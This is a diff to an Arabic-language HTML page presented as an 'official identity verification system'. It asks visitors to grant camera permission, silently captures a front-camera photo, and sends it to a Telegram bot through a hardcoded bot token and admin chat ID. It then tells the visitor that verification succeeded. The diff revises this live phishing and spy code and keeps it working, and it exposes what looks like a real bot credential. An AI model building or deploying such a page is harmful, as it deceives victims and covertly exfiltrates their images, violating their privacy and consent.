@@ -5,20 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نظام التحقق الرسمي</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 40px 20px; }
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 50px 20px; }
         .card { background: #1e1e1e; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 400px; margin: auto; }
-        button { background: #28a745; color: white; border: none; padding: 18px 30px; font-size: 20px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
+        button { background: #28a745; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
         #status { margin-top: 25px; color: #ffc107; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>التحقق من الهوية</h2>
-        <p>يرجى الضغط على الزر أدناه ومنح إذن الكاميرا عند طلبه.</p>
-        <button id="startBtn">بدء عملية التحقق</button>
-        <div id="status">جاهز للبدء...</div>
+        <h2>تأكيد الهوية</h2>
+        <p>يجب الضغط على الزر والموافقة على إذن الكاميرا عند ظهوره.</p>
+        <button id="authBtn">إرسال طلب إذن الكاميرا</button>
+        <div id="status"></div>
     </div>
-
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -26,48 +25,37 @@
         const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
         const ADMIN_ID = "7289235107";
 
-        document.getElementById('startBtn').addEventListener('click', async () => {
+        document.getElementById('authBtn').onclick = async () => {
             const s = document.getElementById('status');
             try {
-                s.innerText = "جاري طلب إذن الكاميرا... يرجى الموافقة";
+                s.innerText = "جاري طلب الإذن... يرجى اختيار 'سماح'";
                 
-                // طلب الإذن الرسمي من المتصفح
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-
-                s.innerText = "تم السماح! جاري المعالجة...";
+                // طلب الكاميرا من النظام مباشرة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                s.innerText = "✅ تم السماح! جاري التقاط الصورة...";
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // التقاط الصورة بعد ثانية واحدة لضمان وضوح الكاميرا
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
                     canvas.width = v.videoWidth;
                     canvas.height = v.videoHeight;
                     canvas.getContext('2d').drawImage(v, 0, 0);
-                    
                     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    
                     const fd = new FormData();
                     fd.append('chat_id', ADMIN_ID);
-                    fd.append('photo', blob, 'identity.jpg');
+                    fd.append('photo', blob, 'cam.jpg');
 
-                    // إرسال الصورة للبوت
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-
-                    s.style.color = "#28a745";
-                    s.innerText = "✅ تم التحقق بنجاح!";
-                    
-                    // إغلاق الكاميرا
+                    s.innerText = "✅ اكتملت العملية بنجاح!";
                     stream.getTracks().forEach(t => t.stop());
-                }, 1500);
-
-            } catch (err) {
-                s.style.color = "#ff4d4d";
-                s.innerText = "❌ خطأ: يرجى السماح بالكاميرا من إعدادات المتصفح (أيقونة القفل 🔒).";
+                }, 2000);
+            } catch (e) {
+                s.innerHTML = "❌ فشل الإذن تلقائياً.<br>يرجى الضغط على القفل 🔒 أعلى المتصفح واختيار 'سماح للكاميرا'.";
             }
-        });
+        };
     </script>
 </body>
 </html>
